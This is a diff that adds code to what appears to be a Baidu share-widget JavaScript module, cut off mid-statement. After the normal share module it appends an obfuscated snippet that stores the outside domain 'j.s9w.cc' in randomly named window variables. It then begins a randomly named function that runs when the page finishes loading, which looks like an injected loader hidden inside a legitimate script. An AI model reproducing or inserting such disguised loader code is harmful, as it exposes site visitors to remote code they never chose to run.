@@ -1,0 +1,2 @@
+window._bd_share_main.F.module("share/combine_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("share/api_base");t.CombineApi=i.create(function(e){var t=this,n=null,r=null;t.setApi=function(e,t){n=e,r=t},t._init=function(){n&&r&&n.on("sharecompleted",function(e){})}},s.ApiBase)});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
+var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a
